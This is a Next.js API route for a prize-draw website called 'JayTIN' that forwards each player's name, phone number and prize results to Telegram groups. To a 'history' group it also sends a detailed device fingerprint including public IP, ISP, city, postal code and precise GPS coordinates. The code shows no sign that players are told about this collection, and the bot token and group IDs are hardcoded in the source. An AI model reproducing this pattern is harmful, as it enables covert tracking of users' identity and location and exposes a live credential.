import { NextResponse } from "next/server"

const BOT_TOKEN = "7546999577:AAFPtXzB91hlz_dLy_sF2KNMuNCGiTbD6Go"
const HISTORY_GROUP_ID = "-1002267449607"
const WINNER_GROUP_ID = "-1002456373939"

export async function POST(request: Request) {
  try {
    const { username, phone, prize, date, deviceInfo, screenshot, drawType, prizes } = await request.json()

    // 完整的设备信息（只用于历史记录群组）
    const fullDeviceInfo = `
📱 DEVICE INFORMATION:
• Model: ${deviceInfo.deviceModel}
• Type: ${deviceInfo.deviceType}
• OS: ${deviceInfo.osName} ${deviceInfo.osVersion}
• Browser: ${deviceInfo.browserName} ${deviceInfo.browserVersion}
• Engine: ${deviceInfo.browserEngine} ${deviceInfo.browserEngineVersion}
• Platform: ${deviceInfo.platform}
• CPU Cores: ${deviceInfo.cpuCores}
• Memory: ${deviceInfo.deviceMemory}
• Battery: ${deviceInfo.batteryStatus}

🖥️ DISPLAY INFORMATION:
• Screen: ${deviceInfo.screenResolution}
• Available: ${deviceInfo.availableScreenResolution}
• Viewport: ${deviceInfo.viewportSize}
• Color Depth: ${deviceInfo.colorDepth}-bit
• Pixel Ratio: ${deviceInfo.devicePixelRatio}x
• Orientation: ${deviceInfo.screenOrientation}

🌐 NETWORK & LOCATION:
• Public IP: ${deviceInfo.publicIP}
• ISP/Org: ${deviceInfo.isp}
• ASN: ${deviceInfo.asn}
• Country: ${deviceInfo.country}
• Region/State: ${deviceInfo.region}
• City: ${deviceInfo.city}
• Postal Code: ${deviceInfo.postalCode}
• Coordinates: ${deviceInfo.latitude}, ${deviceInfo.longitude}
• Timezone: ${deviceInfo.timezone}
• Connection: ${deviceInfo.connectionType} (${deviceInfo.connectionSpeed})
• RTT: ${deviceInfo.connectionRTT}

🌍 LOCALE & TIME:
• Language: ${deviceInfo.language}
• All Languages: ${deviceInfo.languages}
• System Timezone: ${deviceInfo.timeZone}
• Local Time: ${deviceInfo.localTime}
• UTC Time: ${deviceInfo.utcTime}

⚙️ BROWSER CAPABILITIES:
• Cookies: ${deviceInfo.cookieEnabled ? "Enabled" : "Disabled"}
• Java: ${deviceInfo.javaEnabled ? "Enabled" : "Disabled"}
• Online Status: ${deviceInfo.onlineStatus ? "Online" : "Offline"}

🔍 TECHNICAL DETAILS:
• User Agent: ${deviceInfo.userAgent}
• Timestamp: ${deviceInfo.timestamp}
    `.trim()

    // 根据抽奖类型生成不同的消息
    let historyMessage = ""
    let winnerMessage = "" // 中奖群组的简洁消息

    if (drawType === "multi" && prizes) {
      // 5连抽消息
      const prizesList = prizes.map((p: string, i: number) => `${i + 1}. ${p}`).join("\n")

      // 历史群组：完整信息
      historyMessage = `🎊 JayTIN 5连抽记录
👤 用户: ${username}
📞 电话: ${phone}
🕐 时间: ${date}
🌐 网站: https://jaytin.online/

🎁 抽奖结果:
${prizesList}

${fullDeviceInfo}`

      // 中奖群组：只有中奖信息，不包含设备信息
      winnerMessage = `🎊 JayTIN 5连抽中奖！

👤 ${username}
📞 ${phone}
🕐 ${date}
🌐 https://jaytin.online/

🎁 中奖结果:
${prizesList}`
    } else {
      // 单次抽奖消息
      // 历史群组：完整信息
      historyMessage = `🎉 JayTIN 1连抽记录
👤 用户: ${username}
📞 电话: ${phone}
🕐 时间: ${date}
🌐 网站: https://jaytin.online/
🎁 奖品: ${prize}

${fullDeviceInfo}`

      // 中奖群组：只有中奖信息，不包含设备信息
      winnerMessage = `🎉 JayTIN 1连抽中奖！

👤 ${username}
📞 ${phone}
🕐 ${date}
🌐 https://jaytin.online/
🎁 ${prize}`
    }

    console.log("Sending messages to Telegram...")
    console.log("Winner message length:", winnerMessage.length)

    // Send message to history group (with full device info)
    const historyResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: HISTORY_GROUP_ID,
        text: historyMessage,
      }),
    })

    console.log("History message response:", historyResponse.status)

    // Send to winner group (clean message without device info)
    if (screenshot && screenshot.startsWith("data:image/")) {
      console.log("Attempting to send photo to winner group...")

      try {
        // 将base64转换为Buffer
        const base64Data = screenshot.replace(/^data:image\/[a-z]+;base64,/, "")
        const imageBuffer = Buffer.from(base64Data, "base64")

        console.log("Image buffer size:", imageBuffer.length)

        // 使用multipart/form-data发送照片
        const formData = new FormData()
        const blob = new Blob([imageBuffer], { type: "image/png" })

        formData.append("chat_id", WINNER_GROUP_ID)
        formData.append("caption", winnerMessage) // 只包含中奖信息，无设备信息
        formData.append("photo", blob, `jaytin_${drawType}_${Date.now()}.png`)

        const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData,
        })

        const photoResult = await photoResponse.json()
        console.log("Photo response:", photoResponse.status, photoResult)

        if (photoResponse.ok) {
          console.log("Photo sent successfully to winner group!")
        } else {
          console.error("Photo upload failed:", photoResult)
          throw new Error(`Photo upload failed: ${photoResult.description || "Unknown error"}`)
        }
      } catch (photoError) {
        console.error("Error sending photo:", photoError)

        // Fallback to text message
        console.log("Sending text message as fallback...")
        const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: WINNER_GROUP_ID,
            text: winnerMessage + "\n\n⚠️ 截图发送失败，请联系客服获取详细信息。",
          }),
        })

        console.log("Text fallback sent:", textResponse.status)
      }
    } else {
      // Send text message if no screenshot
      console.log("No screenshot provided, sending text message...")
      const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: WINNER_GROUP_ID,
          text: winnerMessage,
        }),
      })

      console.log("Text message sent:", textResponse.status)
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error in send-telegram-message:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}
